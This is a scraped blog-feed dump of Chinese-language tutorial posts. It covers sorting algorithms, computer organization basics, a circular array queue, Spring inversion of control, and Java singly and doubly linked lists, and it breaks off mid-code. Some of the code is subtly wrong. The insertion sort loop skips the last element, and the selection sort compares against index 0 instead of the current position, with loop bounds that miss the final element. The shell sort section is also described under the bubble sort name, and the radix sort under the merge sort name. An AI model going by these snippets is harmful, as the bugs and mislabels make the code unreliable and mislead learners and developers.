基本思想是：把n个待排序的元素看成为一个有序表和一个无序表，开始时有序表中只包含一个元素，无序表中包含有n-1个元素，排序过程中每次从无序表中取出第一个元素，把它的排序码依次与有序表元素的排序码进行比较，将它插入到有序表中的适当位置，使之成为新的有序表。 代码实现 1234567891011121314151617181920212223public static void insertSort(int attr[]) &#123; //从第2个数开始遍历 【1】 for (int i = 1; i &lt; attr.length - 1; i++) &#123; // 等待插入的数的前一个数下标 int insertIndex = i - 1; //等待插入的数的值 int insertValue = attr[i]; // insertIndex不能越界 // insertValue待插入到前面有序列表的数 // insertValue待插入的数 小于 前1个数 while (insertIndex &gt;= 0 &amp;&amp; attr[insertIndex] &gt; insertValue) &#123; // 交换 // attr[insertIndex]后移 attr[insertIndex + 1] = attr[insertIndex]; insertIndex--; &#125; //当退出while循环时，说明插入的位置找到, insertIndex + 1 if (insertIndex + 1 != i) &#123; attr[insertIndex + 1] = insertValue; &#125; &#125; &#125; 选择排序 选择排序（selectSorting)的基本思想是： 第一次从arr[0]~arr[n-1]中选取最小值，与arr[0]交换，第二次从arr[1]~arr[n-1]中选取最小值，与arr[1]交换，第三次从arr[2]~arr[n-1]中选取最小值，与arr[2]交换，…，第i次从arr[i-1]~arr[n-1]中选取最小值，与arr[i-1]交换，…,第n-1次从arr[n-2]~arr[n-1]中选取最小值，与arr[n-2]交换，总共通过n-1次，得到一个按排序码从小到大排列的有序序列。 代码实现 123456789101112131415161718192021222324public class selectSort &#123; public static void selectSort(int attr[]) &#123; for (int i = 0; i &lt; attr.length - 1; i++) &#123; //假设第一个数就是最小值 int minindex = 0; int min = attr[0]; //从1开始遍历 for (int j = 1; j &lt; attr.length - 1; j++) &#123; //如果第0个数（最小值）比第1个数 大 //说明假设的第0个并不是最小值 if (min &gt; attr[j]) &#123; min = attr[j];//重置最小值 minindex = j;//重置最小值索引 &#125; &#125; //如果最小值的索引不是0，就发生交换 if (minindex != i) &#123; //把第0个数（不是最小值）赋值到 第1个数（较小值）的位置 attr[minindex] = attr[i]; //把较小值赋值给第1个数 attr[i] = min; &#125; &#125; &#125; 希尔排序 冒泡排序（BubbleSorting)的基本思想是： 把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止 代码实现 12345678910111213141516171819202122//移动法 //增量gap，并逐步的缩小增量 for (int gap = attr.length/2;gap&gt;0;gap/=2)&#123; //从第gap个元素开始，逐个对其所在的组进行直接插入排序 for (int i =gap;i&lt;attr.length;i++)&#123; // 当前位置 int j = i; //当前位置的值赋值给temp int temp = attr[j]; // 如果 当前组的gap个步长前面的数大于当前位置的数 if(attr[j]&lt;attr[j-gap])&#123; while (j-gap &gt;= 0 &amp;&amp; temp &lt; attr[j-gap])&#123; //移动 attr[j] = attr[j-gap]; j -= gap; &#125; //当退出while循环后，就给temp找到插入的位置 attr[j] = temp; &#125; &#125; &#125; 快速排序 快速排序（QuickSorting) 是对冒泡排序的一种改进。基本思想是：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public static void quickSort(int[] arr,int left, int right) &#123; int l = left; //左下标 int r = right; //右下标 //pivot 中轴值 int pivot = arr[(left + right) / 2]; int temp = 0; //临时变量，作为交换时使用 //while循环的目的是让比pivot 值小放到左边 //比pivot 值大放到右边 while( l &lt; r) &#123; //在pivot的左边一直找,找到大于等于pivot值,才退出 while( arr[l] &lt; pivot) &#123; l += 1; &#125; //在pivot的右边一直找,找到小于等于pivot值,才退出 while(arr[r] &gt; pivot) &#123; r -= 1; &#125; //如果l &gt;= r说明pivot 的左右两的值，已经按照左边全部是 //小于等于pivot值，右边全部是大于等于pivot值 if( l &gt;= r) &#123; break; &#125; //交换 temp = arr[l]; arr[l] = arr[r]; arr[r] = temp; //如果交换完后，发现这个arr[l] == pivot值 相等 r--， 前移 if(arr[l] == pivot) &#123; r -= 1; &#125; //如果交换完后，发现这个arr[r] == pivot值 相等 l++， 后移 if(arr[r] == pivot) &#123; l += 1; &#125; &#125; // 如果 l == r, 必须l++, r--, 否则为出现栈溢出 if (l == r) &#123; l += 1; r -= 1; &#125; //向左递归 if(left &lt; r) &#123; quickSort(arr, left, r); &#125; //向右递归 if(right &gt; l) &#123; quickSort(arr, l, right); &#125; &#125; 归并排序 归并排序（mergeSorting)的基本思想是： 是利用归并的思想实现的排序方法，该算法采用经典的分治（divide-and-conquer）策略（分治法将问题分(divide)成一些小的问题然后递归求解，而治(conquer)的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869//分+合方法 public static void mergeSort(int[] arr, int left, int right, int[] temp) &#123; if(left &lt; right) &#123; int mid = (left + right) / 2; //中间索引 //向左递归进行分解 mergeSort(arr, left, mid, temp); //向右递归进行分解 mergeSort(arr, mid + 1, right, temp); //合并 merge(arr, left, mid, right, temp); &#125; &#125; //合并的方法 /** * * @param arr 排序的原始数组 * @param left 左边有序序列的初始索引 * @param mid 中间索引 * @param right 右边索引 * @param temp 做中转的数组 */ public static void merge(int[] arr, int left, int mid, int right, int[] temp) &#123; int i = left; // 初始化i, 左边有序序列的初始索引 int j = mid + 1; //初始化j, 右边有序序列的初始索引 int t = 0; // 指向temp数组的当前索引 //(一) //先把左右两边(有序)的数据按照规则填充到temp数组 //直到左右两边的有序序列，有一边处理完毕为止 while (i &lt;= mid &amp;&amp; j &lt;= right) &#123;//继续 //如果左边的有序序列的当前元素，小于等于右边有序序列的当前元素 //即将左边的当前元素，填充到 temp数组 //然后 t++, i++ if(arr[i] &lt;= arr[j]) &#123; temp[t] = arr[i]; t += 1; i += 1; &#125; else &#123; //反之,将右边有序序列的当前元素，填充到temp数组 temp[t] = arr[j]; t += 1; j += 1; &#125; &#125; //(二) //把有剩余数据的一边的数据依次全部填充到temp while( i &lt;= mid) &#123; //左边的有序序列还有剩余的元素，就全部填充到temp temp[t] = arr[i]; t += 1; i += 1; &#125; while( j &lt;= right) &#123; //右边的有序序列还有剩余的元素，就全部填充到temp temp[t] = arr[j]; t += 1; j += 1; &#125; //(三) //将temp数组的元素拷贝到arr //注意，并不是每次都拷贝所有 t = 0; int tempLeft = left; // //第一次合并 tempLeft = 0 , right = 1 // tempLeft = 2 right = 3 // tL=0 ri=3 //最后一次 tempLeft = 0 right = 7 while(tempLeft &lt;= right) &#123; arr[tempLeft] = temp[t]; t += 1; tempLeft += 1; &#125; &#125; 基数排序 基数排序（mergeSorting)的基本思想是： 将所有待比较数值统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后, 数列就变成一个有序序列。 代码实现 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758//基数排序方法public static void radixSort(int[] arr) &#123; //根据前面的推导过程，我们可以得到最终的基数排序代码 //1. 得到数组中最大的数的位数 int max = arr[0]; //假设第一数就是最大数 for(int i = 1; i &lt; arr.length; i++) &#123; if (arr[i] &gt; max) &#123; max = arr[i]; &#125; &#125; //得到最大数是几位数 int maxLength = (max + \"\").length(); //定义一个二维数组，表示10个桶, 每个桶就是一个一维数组 //说明 //1. 二维数组包含10个一维数组 //2. 为了防止在放入数的时候，数据溢出，则每个一维数组(桶)，大小定为arr.length //3. 名明确，基数排序是使用空间换时间的经典算法 int[][] bucket = new int[10][arr.length]; //为了记录每个桶中，实际存放了多少个数据,我们定义一个一维数组来记录各个桶的每次放入的数据个数 //可以这里理解 //比如：bucketElementCounts[0] , 记录的就是 bucket[0] 桶的放入数据个数 int[] bucketElementCounts = new int[10]; //这里使用循环将代码处理 for(int i = 0 , n = 1; i &lt; maxLength; i++, n *= 10) &#123; //(针对每个元素的对应位进行排序处理)， 第一次是个位，第二次是十位，第三次是百位.. for(int j = 0; j &lt; arr.length; j++) &#123; //取出每个元素的对应位的值 int digitOfElement = arr[j] / n % 10; //放入到对应的桶中 bucket[digitOfElement][bucketElementCounts[digitOfElement]] = arr[j]; bucketElementCounts[digitOfElement]++; &#125; //按照这个桶的顺序(一维数组的下标依次取出数据，放入原来数组) int index = 0; //遍历每一桶，并将桶中是数据，放入到原数组 for(int k = 0; k &lt; bucketElementCounts.length; k++) &#123; //如果桶中，有数据，我们才放入到原数组 if(bucketElementCounts[k] != 0) &#123; //循环该桶即第k个桶(即第k个一维数组), 放入 for(int l = 0; l &lt; bucketElementCounts[k]; l++) &#123; //取出元素放入到arr arr[index++] = bucket[k][l]; &#125; &#125; //第i+1轮处理后，需要将每个 bucketElementCounts[k] = 0 ！！！！ bucketElementCounts[k] = 0; &#125; &#125;&#125; 各个算法的复杂度","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"计算机组成原理","slug":"计算机组成原理","date":"2020-05-14T06:04:21.000Z","updated":"2021-04-11T17:11:29.021Z","comments":true,"path":"principles-of-computer-organization/","link":"","permalink":"https://kayleh.top/principles-of-computer-organization/","excerpt":"计算机组成原理1.第一台电子计算机何时何地诞生？英文全称？1946年2月14日 美国宾夕法尼亚大学","text":"计算机组成原理1.第一台电子计算机何时何地诞生？英文全称？1946年2月14日 美国宾夕法尼亚大学 ENIAC：电子数字积分计算机 Electronic(电子的) Numerical(数字的) Integrator(综合者) And Calculator(计算机) 2.冯·诺依曼型计算机组成,思想?计算机组成: 运算器、控制器、存储器、输入设备、输出设备。 思想： 采用二进制的形式表示数据和指令，将数据和指令事先保存在存储器中，按照顺序执行程序来控制计算机工作运行。 3.现代计算机硬件系统与冯·诺依曼型计算机组成有什么不同？相同点： 现代计算机仍是冯·诺依曼体系结构。 不同点：组成形式改变很大 (1)逻辑元件组装成电路高度集成,把运算、控制器集成到一块CPU芯片上。 (2)存储器分为三级：高速缓冲存储器Cache，主存储器(内存),外部存储器; 其中Cache现在都集成在CPU里,主存由内存条实现,外部存储器主要有机械硬盘,固态硬盘等; (3)输出与输入设备主要有显示屏,鼠标,键盘. 显示器有专门显示接口(集成或独立显卡)连接CPU或主存,键盘和鼠标也通过集成接口CPU. 此外还配置集成网卡和声卡. (4)USB多种连接接口实现网络与多媒体连接.整个系统采用多级总线结构组成. 4.CPU的性能公式,性能指标,如何评价?","categories":[],"tags":[{"name":"computer","slug":"computer","permalink":"https://kayleh.top/tags/computer/"}]},{"title":"queue","slug":"队列","date":"2020-05-14T00:52:39.000Z","updated":"2021-04-11T17:11:29.090Z","comments":true,"path":"queue/","link":"","permalink":"https://kayleh.top/queue/","excerpt":"队列","text":"队列 定义：遵循先进先出，就是队列。可以想象为排队，先排队的人先办理业务。 队列是一个有序列表。 遵循先进先出的原则。即：先存入的数据先取出，后存入的数据后取出。 示意：数组模拟： 队列本身是有序列表，如使用数组的结构来存储队列的数据，因为队列的输出、输入是分别从前后端来处理，因此需要两个变量front及rear分别记录队列前后端的下标，front会随着数据输出而改变，而rear则是随着数据输入而改变，其中 maxSize是该队列的最大容量。如图所示。 用稀疏数组代替二维数组，第0行表示稀疏数组的总行，总列和所需内容的个数。 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151package queue;import java.util.Scanner;public class CircleArrayQueueDemo &#123; public static void main(String[] args) &#123; //测试 System.out.println(\"测试数组模拟环形队列的案例~~~\"); // 创建一个环形队列 CircleArray queue = new CircleArray(4); //说明设置4, 其队列的有效数据最大是3 char key = ' '; // 接收用户输入 Scanner scanner = new Scanner(System.in);// boolean loop = true; // 输出一个菜单 while (loop) &#123; System.out.println(\"s(show): 显示队列\"); System.out.println(\"e(exit): 退出程序\"); System.out.println(\"a(add): 添加数据到队列\"); System.out.println(\"g(get): 从队列取出数据\"); System.out.println(\"h(head): 查看队列头的数据\"); key = scanner.next().charAt(0);// 接收一个字符 switch (key) &#123; case 's': queue.showQueue(); break; case 'a': System.out.println(\"输出一个数\"); int value = scanner.nextInt(); queue.addQueue(value); break; case 'g': // 取出数据 try &#123; int res = queue.getQueue(); System.out.printf(\"取出的数据是%d\\n\", res); &#125; catch (Exception e) &#123; // TODO: handle exception System.out.println(e.getMessage()); &#125; break; case 'h': // 查看队列头的数据 try &#123; int res = queue.headQueue(); System.out.printf(\"队列头的数据是%d\\n\", res); &#125; catch (Exception e) &#123; // TODO: handle exception System.out.println(e.getMessage()); &#125; break; case 'e': // 退出 scanner.close(); loop = false; break; default: break; &#125; &#125; System.out.println(\"程序退出~~\"); &#125;&#125;class CircleArray &#123; private int maxSize; // 表示数组的最大容量 //front 变量的含义做一个调整：front 就指向队列的第一个元素, 也就是说 arr[front] 就是队列的第一个元素 //front 的初始值 = 0 private int front; //rear 变量的含义做一个调整：rear 指向队列的最后一个元素的后一个位置. 因为希望空出一个空间做为约定. //rear 的初始值 = 0 private int rear; // 队列尾 private int[] arr; // 该数据用于存放数据, 模拟队列 public CircleArray(int arrMaxSize) &#123; maxSize = arrMaxSize; arr = new int[maxSize]; &#125; // 判断队列是否满 public boolean isFull() &#123; return (rear + 1) % maxSize == front; &#125; // 判断队列是否为空 public boolean isEmpty() &#123; return rear == front; &#125; // 添加数据到队列 public void addQueue(int n) &#123; // 判断队列是否满 if (isFull()) &#123; System.out.println(\"队列满，不能加入数据~\"); return; &#125; //直接将数据加入 arr[rear] = n; //将 rear 后移, 这里必须考虑取模 rear = (rear + 1) % maxSize; &#125; // 获取队列的数据, 出队列 public int getQueue() &#123; // 判断队列是否空 if (isEmpty()) &#123; // 通过抛出异常 throw new RuntimeException(\"队列空，不能取数据\"); &#125; // 这里需要分析出 front是指向队列的第一个元素 // 1. 先把 front 对应的值保留到一个临时变量 // 2. 将 front 后移, 考虑取模 // 3. 将临时保存的变量返回 int value = arr[front]; front = (front + 1) % maxSize; return value; &#125; // 显示队列的所有数据 public void showQueue() &#123; // 遍历 if (isEmpty()) &#123; System.out.println(\"队列空的，没有数据~~\"); return; &#125; // 思路：从front开始遍历，遍历多少个元素 // 动脑筋 for (int i = front; i &lt; front + size() ; i++) &#123; System.out.printf(\"arr[%d]=%d\\n\", i % maxSize, arr[i % maxSize]); &#125; &#125; // 求出当前队列有效数据的个数 public int size() &#123; // rear = 2 // front = 1 // maxSize = 3 return (rear + maxSize - front) % maxSize; &#125; // 显示队列的头数据， 注意不是取出数据 public int headQueue() &#123; // 判断 if (isEmpty()) &#123; throw new RuntimeException(\"队列空的，没有数据~~\"); &#125; return arr[front]; &#125;&#125;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"}]},{"title":"Inversion of Control控制反转","slug":"Inversion-of-Control控制反转","date":"2020-05-13T00:42:55.000Z","updated":"2021-04-11T17:11:28.180Z","comments":true,"path":"inversion-of-control/","link":"","permalink":"https://kayleh.top/inversion-of-control/","excerpt":"控制反转的定义","text":"控制反转的定义 Inversion of Control控制反转，贯穿Spring的始终，Spring的核心。由spring来负责控制对象的生命周期和对象间的关系。 IOC的思想是反转资源获取方向.传统的资源查找方式要求组件向容器发起请求查找资源.作为回应,容器适时的返回资源,而应用IOC之后,则是容器主动的将资源推送给它所管理的组件,组件所要做的仅仅是选择一种合适的方式来接受资源,这种行为也被称为查找的被动形式. ▼传统的方法获取： 1Pojo pojo = new Pojo( ); ▼Spring管理的bean获取： 12@AutowiredPojo pojo; ’ 对象的生命周期由Spring来管理，直接从Spring那里去获取一个对象。IOC是反转控制 (Inversion Of Control)的缩写，就像控制权从本来在自己手里，交给了Spring。‘","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"}]},{"title":"LinkedList","slug":"链表","date":"2020-05-12T03:21:40.000Z","updated":"2021-04-11T17:11:29.081Z","comments":true,"path":"linked-list/","link":"","permalink":"https://kayleh.top/linked-list/","excerpt":"链表是有序的列表，但它在内存里是无序的。","text":"链表是有序的列表，但它在内存里是无序的。 链表是以节点的方式来存储,是链式存储 每个节点包含data 域， next 域：指向下一个节点 各个节点不一定是连续存储. 链表分带头节点的链表和没有头节点的链表，根据实际的需求来确定 ▼单链表： 实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655package linkedlist;/** * @Author * @Date: 2020/5/11 10:59 */import java.util.Stack;public class SingleLinkedListDemo &#123; public static void main(String[] args) &#123; //进行测试 //先创建节点 HeroNode hero1 = new HeroNode(1, \"宋江\", \"及时雨\"); HeroNode hero2 = new HeroNode(2, \"卢俊义\", \"玉麒麟\"); HeroNode hero3 = new HeroNode(3, \"吴用\", \"智多星\"); HeroNode hero4 = new HeroNode(4, \"林冲\", \"豹子头\"); //创建要给链表 SingleLinkedList singleLinkedList = new SingleLinkedList(); //加入 singleLinkedList.add(hero1); singleLinkedList.add(hero4); singleLinkedList.add(hero2); singleLinkedList.add(hero3); // 测试一下单链表的反转功能 System.out.println(\"原来链表的情况~~\"); singleLinkedList.list();// System.out.println(\"反转单链表~~\");// reversetList(singleLinkedList.getHead());// singleLinkedList.list(); System.out.println(\"测试逆序打印单链表, 没有改变链表的结构~~\"); reversetList(singleLinkedList.getHead()); //加入按照编号的顺序 singleLinkedList.addByOrder(hero1); singleLinkedList.addByOrder(hero4); singleLinkedList.addByOrder(hero2); singleLinkedList.addByOrder(hero3); //显示一把 singleLinkedList.list(); //测试修改节点的代码 HeroNode newHeroNode = new HeroNode(2, \"小卢\", \"玉麒麟~~\"); singleLinkedList.update(newHeroNode); System.out.println(\"修改后的链表情况~~\"); singleLinkedList.list(); //删除一个节点 singleLinkedList.del(1); singleLinkedList.del(4); System.out.println(\"删除后的链表情况~~\"); singleLinkedList.list(); //测试一下 求单链表中有效节点的个数 System.out.println(\"有效的节点个数=\" + getLength(singleLinkedList.getHead()));//2 //测试一下看看是否得到了倒数第K个节点 HeroNode res = findLastIndexNode(singleLinkedList.getHead(), 3); System.out.println(\"res=\" + res); &#125; //将单链表反转 public static void reversetList(HeroNode head) &#123; //如果当前链表为空，或者只有一个节点，无需反转，直接返回 if(head.next == null || head.next.next == null) &#123; return ; &#125; //定义一个辅助的指针(变量)，帮助我们遍历原来的链表 HeroNode cur = head.next; HeroNode next = null;// 指向当前节点[cur]的下一个节点 HeroNode reverseHead = new HeroNode(0, \"\", \"\"); //遍历原来的链表，每遍历一个节点，就将其取出，并放在新的链表reverseHead 的最前端 //动脑筋 while(cur != null) &#123; next = cur.next;//先暂时保存当前节点的下一个节点，因为后面需要使用 cur.next = reverseHead.next;//将cur的下一个节点指向新的链表的最前端 reverseHead.next = cur; //将cur 连接到新的链表上 cur = next;//让cur后移 &#125; //将head.next 指向 reverseHead.next , 实现单链表的反转 head.next = reverseHead.next; &#125; //查找单链表中的倒数第k个结点 【新浪面试题】 //思路 //1. 编写一个方法，接收head节点，同时接收一个index //2. index 表示是倒数第index个节点 //3. 先把链表从头到尾遍历，得到链表的总的长度 getLength //4. 得到size 后，我们从链表的第一个开始遍历 (size-index)个，就可以得到 //5. 如果找到了，则返回该节点，否则返回nulll public static HeroNode findLastIndexNode(HeroNode head, int index) &#123; //判断如果链表为空，返回null if(head.next == null) &#123; return null;//没有找到 &#125; //第一个遍历得到链表的长度(节点个数) int size = getLength(head); //第二次遍历 size-index 位置，就是我们倒数的第K个节点 //先做一个index的校验 if(index &lt;=0 || index &gt; size) &#123; return null; &#125; //定义给辅助变量， for 循环定位到倒数的index HeroNode cur = head.next; //3 // 3 - 1 = 2 for(int i =0; i&lt; size - index; i++) &#123; cur = cur.next; &#125; return cur; &#125; //方法：获取到单链表的节点的个数(如果是带头结点的链表，需求不统计头节点) /** * * @param head 链表的头节点 * @return 返回的就是有效节点的个数 */ public static int getLength(HeroNode head) &#123; if(head.next == null) &#123; //空链表 return 0; &#125; int length = 0; //定义一个辅助的变量, 这里我们没有统计头节点 HeroNode cur = head.next; while(cur != null) &#123; length++; cur = cur.next; //遍历 &#125; return length; &#125;&#125;//定义SingleLinkedList 管理我们的英雄class SingleLinkedList &#123; //先初始化一个头节点, 头节点不要动, 不存放具体的数据 private HeroNode head = new HeroNode(0, \"\", \"\"); //返回头节点 public HeroNode getHead() &#123; return head; &#125; //添加节点到单向链表 //思路，当不考虑编号顺序时 //1. 找到当前链表的最后节点 //2. 将最后这个节点的next 指向 新的节点 public void add(HeroNode heroNode) &#123; //因为head节点不能动，因此我们需要一个辅助遍历 temp HeroNode temp = head; //遍历链表，找到最后 while(true) &#123; //找到链表的最后 if(temp.next == null) &#123;// break; &#125; //如果没有找到最后, 将将temp后移 temp = temp.next; &#125; //当退出while循环时，temp就指向了链表的最后 //将最后这个节点的next 指向 新的节点 temp.next = heroNode; &#125; //第二种方式在添加英雄时，根据排名将英雄插入到指定位置 //(如果有这个排名，则添加失败，并给出提示) public void addByOrder(HeroNode heroNode) &#123; //因为头节点不能动，因此我们仍然通过一个辅助指针(变量)来帮助找到添加的位置 //因为单链表，因为我们找的temp 是位于 添加位置的前一个节点，否则插入不了 HeroNode temp = head; boolean flag = false; // flag标志添加的编号是否存在，默认为false while(true) &#123; if(temp.next == null) &#123;//说明temp已经在链表的最后 break; // &#125; if(temp.next.no &gt; heroNode.no) &#123; //位置找到，就在temp的后面插入 break; &#125; else if (temp.next.no == heroNode.no) &#123;//说明希望添加的heroNode的编号已然存在 flag = true; //说明编号存在 break; &#125; temp = temp.next; //后移，遍历当前链表 &#125; //判断flag 的值 if(flag) &#123; //不能添加，说明编号存在 System.out.printf(\"准备插入的英雄的编号 %d 已经存在了, 不能加入\\n\", heroNode.no); &#125; else &#123; //插入到链表中, temp的后面 heroNode.next = temp.next; temp.next = heroNode; &#125; &#125; //修改节点的信息, 根据no编号来修改，即no编号不能改. //说明 //1. 根据 newHeroNode 的 no 来修改即可 public void update(HeroNode newHeroNode) &#123; //判断是否空 if(head.next == null) &#123; System.out.println(\"链表为空~\"); return; &#125; //找到需要修改的节点, 根据no编号 //定义一个辅助变量 HeroNode temp = head.next; boolean flag = false; //表示是否找到该节点 while(true) &#123; if (temp == null) &#123; break; //已经遍历完链表 &#125; if(temp.no == newHeroNode.no) &#123; //找到 flag = true; break; &#125; temp = temp.next; &#125; //根据flag 判断是否找到要修改的节点 if(flag) &#123; temp.name = newHeroNode.name; temp.nickname = newHeroNode.nickname; &#125; else &#123; //没有找到 System.out.printf(\"没有找到 编号 %d 的节点，不能修改\\n\", newHeroNode.no); &#125; &#125; //删除节点 //思路 //1. head 不能动，因此我们需要一个temp辅助节点找到待删除节点的前一个节点 //2. 说明我们在比较时，是temp.next.no 和 需要删除的节点的no比较 public void del(int no) &#123; HeroNode temp = head; boolean flag = false; // 标志是否找到待删除节点的 while(true) &#123; if(temp.next == null) &#123; //已经到链表的最后 break; &#125; if(temp.next.no == no) &#123; //找到的待删除节点的前一个节点temp flag = true; break; &#125; temp = temp.next; //temp后移，遍历 &#125; //判断flag if(flag) &#123; //找到 //可以删除 temp.next = temp.next.next; &#125;else &#123; System.out.printf(\"要删除的 %d 节点不存在\\n\", no); &#125; &#125; //显示链表[遍历] public void list() &#123; //判断链表是否为空 if(head.next == null) &#123; System.out.println(\"链表为空\"); return; &#125; //因为头节点，不能动，因此我们需要一个辅助变量来遍历 HeroNode temp = head.next; while(true) &#123; //判断是否到链表最后 if(temp == null) &#123; break; &#125; //输出节点的信息 System.out.println(temp); //将temp后移， 一定小心 temp = temp.next; &#125; &#125;&#125;//定义HeroNode ， 每个HeroNode 对象就是一个节点class HeroNode &#123; public int no; public String name; public String nickname; public HeroNode next; //指向下一个节点 //构造器 public HeroNode(int no, String name, String nickname) &#123; this.no = no; this.name = name; this.nickname = nickname; &#125; //为了显示方法，我们重新toString @Override public String toString() &#123; return \"HeroNode [no=\" + no + \", name=\" + name + \", nickname=\" + nickname + \"]\"; &#125;&#125;▼双向链表：单向链表，查找的方向只能是一个方向，而双向链表可以向前或者向后查找。单向链表不能自我删除，需要靠辅助节点，而双向链表，则可以自我删除，所以前面我们单链表删除时节点，总是找到temp,temp是待删除节点的前一个节点package linkedlist;public class DoubleLinkedListDemo &#123; public static void main(String[] args) &#123; // 测试 System.out.println(\"双向链表的测试\"); // 先创建节点 HeroNode2 hero1 = new HeroNode2(1, \"宋江\", \"及时雨\"); HeroNode2 hero2 = new HeroNode2(2, \"卢俊义\", \"玉麒麟\"); HeroNode2 hero3 = new HeroNode2(3, \"吴用\", \"智多星\"); HeroNode2 hero4 = new HeroNode2(4, \"林冲\", \"豹子头\"); // 创建一个双向链表 DoubleLinkedList doubleLinkedList = new DoubleLinkedList(); doubleLinkedList.add(hero1); doubleLinkedList.add(hero2); doubleLinkedList.add(hero3); doubleLinkedList.add(hero4); doubleLinkedList.list(); // 修改 HeroNode2 newHeroNode = new HeroNode2(4, \"公孙胜\", \"入云龙\"); doubleLinkedList.update(newHeroNode); System.out.println(\"修改后的链表情况\"); doubleLinkedList.list(); // 删除 doubleLinkedList.del(3); System.out.println(\"删除后的链表情况~~\"); doubleLinkedList.list(); &#125;&#125;// 创建一个双向链表的类class DoubleLinkedList &#123; // 先初始化一个头节点, 头节点不要动, 不存放具体的数据 private HeroNode2 head = new HeroNode2(0, \"\", \"\"); // 返回头节点 public HeroNode2 getHead() &#123; return head; &#125; // 遍历双向链表的方法 // 显示链表[遍历] public void list() &#123; // 判断链表是否为空 if (head.next == null) &#123; System.out.println(\"链表为空\"); return; &#125; // 因为头节点，不能动，因此我们需要一个辅助变量来遍历 HeroNode2 temp = head.next; while (true) &#123; // 判断是否到链表最后 if (temp == null) &#123; break; &#125; // 输出节点的信息 System.out.println(temp); // 将temp后移， 一定小心 temp = temp.next; &#125; &#125; // 添加一个节点到双向链表的最后. public void add(HeroNode2 heroNode) &#123; // 因为head节点不能动，因此我们需要一个辅助遍历 temp HeroNode2 temp = head; // 遍历链表，找到最后 while (true) &#123; // 找到链表的最后 if (temp.next == null) &#123;// break; &#125; // 如果没有找到最后, 将将temp后移 temp = temp.next; &#125; // 当退出while循环时，temp就指向了链表的最后 // 形成一个双向链表 temp.next = heroNode; heroNode.pre = temp; &#125; // 修改一个节点的内容, 可以看到双向链表的节点内容修改和单向链表一样 // 只是 节点类型改成 HeroNode2 public void update(HeroNode2 newHeroNode) &#123; // 判断是否空 if (head.next == null) &#123; System.out.println(\"链表为空~\"); return; &#125; // 找到需要修改的节点, 根据no编号 // 定义一个辅助变量 HeroNode2 temp = head.next; boolean flag = false; // 表示是否找到该节点 while (true) &#123; if (temp == null) &#123; break; // 已经遍历完链表 &#125; if (temp.no == newHeroNode.no) &#123; // 找到 flag = true; break; &#125; temp = temp.next; &#125; // 根据flag 判断是否找到要修改的节点 if (flag) &#123; temp.name = newHeroNode.name; temp.nickname = newHeroNode.nickname; &#125; else &#123; // 没有找到 System.out.printf(\"没有找到 编号 %d 的节点，不能修改\\n\", newHeroNode.no); &#125; &#125; // 从双向链表中删除一个节点, // 说明 // 1 对于双向链表，我们可以直接找到要删除的这个节点 // 2 找到后，自我删除即可 public void del(int no) &#123; // 判断当前链表是否为空 if (head.next == null) &#123;// 空链表 System.out.println(\"链表为空，无法删除\"); return; &#125; HeroNode2 temp = head.next; // 辅助变量(指针) boolean flag = false; // 标志是否找到待删除节点的 while (true) &#123; if (temp == null) &#123; // 已经到链表的最后 break; &#125; if (temp.no == no) &#123; // 找到的待删除节点的前一个节点temp flag = true; break; &#125; temp = temp.next; // temp后移，遍历 &#125; // 判断flag if (flag) &#123; // 找到 // 可以删除 // temp.next = temp.next.next;[单向链表] temp.pre.next = temp.next; // 这里我们的代码有问题? // 如果是最后一个节点，就不需要执行下面这句话，否则出现空指针 if (temp.next != null) &#123; temp.next.pre = temp.pre; &#125; &#125; else &#123; System.out.printf(\"要删除的 %d 节点不存在\\n\", no); &#125; &#125;&#125;// 定义HeroNode2 ， 每个HeroNode 对象就是一个节点class HeroNode2 &#123; public int no; public String name; public String nickname; public HeroNode2 next; // 指向下一个节点, 默认为null public HeroNode2 pre; // 指向前一个节点, 默认为null // 构造器 public HeroNode2(int no, String name, String nickname) &#123; this.no = no; this.name = name; this.nickname = nickname; &#125; // 为了显示方法，我们重新toString @Override public String toString() &#123; return \"HeroNode [no=\" + no + \", name=\" + name + \", nickname=\" + nickname + \"]\"; &#125;&#125;▼循环链表：package linkedlist;public class Josepfu &#123; public static void main(String[] 